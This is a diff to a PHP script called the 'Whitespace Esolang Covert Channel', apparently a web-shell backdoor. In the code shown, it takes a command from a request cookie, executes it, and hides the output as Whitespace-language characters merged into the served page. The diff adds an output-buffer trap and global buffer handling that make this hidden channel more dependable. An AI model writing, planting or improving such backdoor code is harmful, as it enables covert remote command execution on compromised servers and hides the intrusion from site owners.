@@ -1,12 +1,13 @@
 <?php
 
+error_reporting(E_ALL);
+
 /**
  * Whitespace Esolang Covert Channel (WCC)
  *
  * @author	Jan Seidl <jseidl at wroot dot org>
  * @date	2014-02-18
  */
-
 
 # Configuration
 
@@ -26,10 +27,13 @@ define('W_STACK_PUSH', W_STACK.SPACE);
 define('W_IO_OUTPUT_NUMBER', W_IO.SPACE.TAB);
 define('W_IO_OUTPUT_CHAR', W_IO.SPACE.SPACE);
 
+global $buffer;
+
 /**
  * WCC Functions
  */
 function wcc_init() {
+
 
 	if (
 		!isset($_COOKIE[WCC_COOKIE_KEY]) ||
@@ -37,7 +41,7 @@ function wcc_init() {
 	) return false; # early return
 
 	# Start buffering
-	ob_start();
+	ob_start("wcc_output_trap");
 
 	# Exec command
 	$cmd_output = wcc_exec($_COOKIE[WCC_COOKIE_KEY]); # gzipped to reduce payload size & whitespaced
@@ -51,6 +55,12 @@ function wcc_init() {
 
 }//end :: wcc_init
 
+function wcc_output_trap($current_buffer) {
+    global $buffer;
+    $buffer .= $current_buffer;
+    return '';
+}//end :: wcc_output_trap
+
 function wcc_shutdown($whitespace_payload) {
 	register_shutdown_function('wcc_merge_output', $whitespace_payload); # register last ;)
 }//end :: wcc_shutdown
@@ -58,7 +68,8 @@ function wcc_shutdown($whitespace_payload) {
 function wcc_merge_output($whitespace_payload) {
 
 	# Get value of output buffer so far
-	$page_content = ob_get_contents();
+    global $buffer;
+	$page_content = $buffer.ob_get_contents();
 	# Stop buffering
 	ob_end_clean();
 
